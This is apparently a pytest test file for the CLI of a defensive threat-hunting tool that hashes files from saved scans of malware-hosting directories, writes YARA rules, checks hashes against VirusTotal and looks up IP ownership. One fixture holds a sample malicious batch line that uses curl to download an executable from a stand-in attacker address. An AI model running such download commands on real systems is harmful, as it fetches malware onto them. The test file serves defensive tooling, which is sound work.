"""The command line, for the parts of the console that belong in a pipe.

A saved run is the source for all of it: these commands never reach the network,
except `check`, which asks about one digest and says so.
"""

from __future__ import annotations

import json
from pathlib import Path

from typer.testing import CliRunner

from dirsift import cli
from dirsift.enrich import MissingKey
from dirsift.models import Entry, Ioc, ScanResult, Verdict

runner = CliRunner()
TARGET = "http://203.0.113.24/files/"


def saved_run(tmp_path: Path) -> Path:
    result = ScanResult(
        root_url=TARGET,
        entries=[
            Entry(
                url=TARGET + "install.bat",
                name="install.bat",
                depth=1,
                kind="script",
                fetched_bytes=120,
                sha256="a" * 64,
                md5="b" * 32,
                text_preview="curl -o svc4.exe http://203.0.113.24/bin/svc4.exe",
            ),
            Entry(
                url=TARGET + "bin/svc4.exe",
                name="svc4.exe",
                depth=2,
                kind="pe",
                fetched_bytes=4096,
                truncated=True,
                head_hex="4d5a9000",
            ),
        ],
        iocs=[
            Ioc(
                ioc_type="url",
                value="http://203.0.113.24/bin/svc4.exe",
                defanged="hxxp://203[.]0[.]113[.]24/bin/svc4[.]exe",
                source_url=TARGET + "install.bat",
            )
        ],
    )
    path = tmp_path / "run.json"
    path.write_text(result.model_dump_json(indent=2), encoding="utf-8")
    return path


def test_hashes_prints_only_what_was_read_whole(tmp_path: Path):
    reply = runner.invoke(cli.app, ["hashes", str(saved_run(tmp_path))])
    assert reply.exit_code == 0
    assert "a" * 64 in reply.stdout
    assert "b" * 32 in reply.stdout
    assert "install.bat" in reply.stdout
    assert "svc4.exe" not in reply.stdout  # cut at the ceiling, so no hash


def test_rules_writes_a_rule_for_the_file_that_carried_indicators(tmp_path: Path):
    reply = runner.invoke(cli.app, ["rules", str(saved_run(tmp_path))])
    assert reply.exit_code == 0
    assert 'author = "cyb3rp03t"' in reply.stdout
    assert '"http://203.0.113.24/bin/svc4.exe" ascii' in reply.stdout


def test_rules_can_be_narrowed_to_one_file(tmp_path: Path):
    run = saved_run(tmp_path)
    reply = runner.invoke(cli.app, ["rules", str(run), "--name", "svc4.exe"])
    assert reply.exit_code == 0
    assert "install.bat" not in reply.stdout


def test_rules_can_be_written_to_a_file(tmp_path: Path):
    run = saved_run(tmp_path)
    out = tmp_path / "hunt.yar"
    reply = runner.invoke(cli.app, ["rules", str(run), "--out", str(out)])
    assert reply.exit_code == 0
    assert 'author = "cyb3rp03t"' in out.read_text(encoding="utf-8")


def test_check_reports_the_score(tmp_path: Path, monkeypatch):
    def lookup(digest: str, **kwargs):
        assert digest == "c" * 64
        return Verdict(found=True, malicious=21, total=63, analysed="2026-09-16")

    monkeypatch.setattr(cli, "lookup_hash", lookup)
    reply = runner.invoke(cli.app, ["check", "c" * 64])
    assert reply.exit_code == 0
    assert "21/63" in reply.stdout


def test_check_without_a_key_says_how_to_set_one(monkeypatch):
    def lookup(digest: str, **kwargs):
        raise MissingKey("no VirusTotal key. Set DIRSIFT_VT_API_KEY in the environment.")

    monkeypatch.setattr(cli, "lookup_hash", lookup)
    reply = runner.invoke(cli.app, ["check", "d" * 64])
    assert reply.exit_code != 0
    assert "DIRSIFT_VT_API_KEY" in reply.stdout


def test_check_refuses_something_that_is_not_a_hash(monkeypatch):
    def lookup(digest: str, **kwargs):  # pragma: no cover
        raise AssertionError("a request was made for something that is not a hash")

    monkeypatch.setattr(cli, "lookup_hash", lookup)
    reply = runner.invoke(cli.app, ["check", "not-a-hash"])
    assert reply.exit_code != 0


def test_a_saved_run_is_all_these_commands_touch(tmp_path: Path):
    """No command here reaches the target: the run file is the whole source."""
    run = saved_run(tmp_path)
    before = json.loads(run.read_text(encoding="utf-8"))
    runner.invoke(cli.app, ["hashes", str(run)])
    runner.invoke(cli.app, ["rules", str(run)])
    assert json.loads(run.read_text(encoding="utf-8")) == before


# -- placing an address, from a table already on the machine ---------------

ASN_ROWS = "203.0.113.0\t203.0.113.255\t64496\tNL\tEXAMPLE-HOSTING\n"


def test_net_says_which_network_an_address_is_in(tmp_path: Path):
    table = tmp_path / "ip2asn.tsv"
    table.write_text(ASN_ROWS, encoding="utf-8")
    reply = runner.invoke(cli.app, ["net", "203.0.113.24", "--db", str(table)])
    assert reply.exit_code == 0
    assert "AS64496" in reply.stdout
    assert "EXAMPLE-HOSTING" in reply.stdout
    assert "NL" in reply.stdout


def test_net_without_a_table_says_where_to_get_one(tmp_path: Path):
    reply = runner.invoke(cli.app, ["net", "203.0.113.24", "--db", str(tmp_path / "absent.tsv")])
    assert reply.exit_code != 0
    assert "iptoasn" in reply.stdout
    assert "DIRSIFT_ASN_DB" in reply.stdout


def test_net_is_honest_when_the_table_has_no_answer(tmp_path: Path):
    table = tmp_path / "ip2asn.tsv"
    table.write_text(ASN_ROWS, encoding="utf-8")
    reply = runner.invoke(cli.app, ["net", "10.0.0.1", "--db", str(table)])
    assert reply.exit_code != 0
    assert "ip2asn.tsv" in reply.stdout  # which table was asked, not just "no"
